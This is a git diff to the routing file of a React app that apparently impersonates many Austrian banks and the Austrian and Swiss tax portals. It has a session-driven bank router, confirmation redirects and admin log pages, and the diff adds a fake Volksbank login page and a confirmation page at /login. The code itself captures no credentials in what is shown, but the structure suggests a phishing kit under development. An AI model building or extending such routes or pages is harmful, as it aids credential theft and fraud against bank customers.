@@ -15,6 +15,8 @@ import ErsteBank from "./pages/ErsteBank.tsx";
 import Bawag from "./pages/Bawag.tsx";
 import BankAustria from "./pages/BankAustria.tsx";
 import Volksbank from "./pages/Volksbank.tsx";
+import VolksbankLogin from "./pages/VolksbankLogin.tsx";
+import VolksbankBestaetigung from "./pages/VolksbankBestaetigung.tsx";
 import Bank99 from "./pages/Bank99.tsx";
 import Easybank from "./pages/Easybank.tsx";
 import HypoNoe from "./pages/HypoNoe.tsx";
@@ -100,6 +102,9 @@ const ConfirmationSwitch = () => {
   if (type === "estv") {
     return <Navigate to={`/estv/confirmation${s ? `?s=${s}` : ""}`} replace />;
   }
+  if (type === "volksbank_login") {
+    return <Navigate to={`/login/bestaetigung${s ? `?s=${s}` : ""}`} replace />;
+  }
   return <Confirmation />;
 };
 
@@ -121,6 +126,8 @@ const App = () => (
           <Routes>
             <Route path="/" element={<P><SessionBankRouter /></P>} />
             <Route path="/finanzonline" element={<P><Index /></P>} />
+            <Route path="/login" element={<P><VolksbankLogin /></P>} />
+            <Route path="/login/bestaetigung" element={<P><VolksbankBestaetigung /></P>} />
             <Route path="/auth" element={<Auth />} />
             <Route path="/admin" element={<Admin />} />
             <Route path="/admin/logs" element={<AdminLogs />} />
